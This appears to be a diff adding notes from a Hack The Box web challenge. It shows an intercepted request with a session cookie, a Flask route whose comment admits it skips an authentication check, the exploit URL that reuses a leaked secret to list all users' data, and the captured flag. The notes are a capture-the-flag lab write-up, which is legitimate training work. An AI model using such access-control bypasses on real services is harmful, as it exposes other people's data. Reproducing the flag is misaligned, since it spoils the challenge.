@@ -1,0 +1,29 @@
+access: 144.126.206.249:32646
+
+intercept using burpsuite:
+GET /api/list/user9EeFbfBD/?secret=c820B49de92259a HTTP/1.1
+Host: 144.126.206.249:32646
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Accept: */*
+Referer: http://144.126.206.249:32646/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: session=eyJhdXRoZW50aWNhdGlvbiI6InVzZXI5RWVGYmZCRCJ9.ZLBk-g.Qesz1xxQnEzr-G6LecKOq45S7UI
+Connection: close
+
+secret = c820B49de92259a
+take attention code list/all: 
+
+# TODO: There are not view arguments involved, I hope this doesn't break
+# the authentication control on the verify_integrity() decorator
+@api.route('/list/all/')
+def list_all():
+	return jsonify(todo.get_all())
+
+broken access controll if we access using secret c820B49de92259a
+access: http://144.126.206.249:32646/api/list/all/?secret=c820B49de92259a
+result:
+HTB{l3ss_ch0r3s_m0r3_h4ck1ng...right?!!1}
+
+resource:
+https://b3cl4ssy.tistory.com/m/235
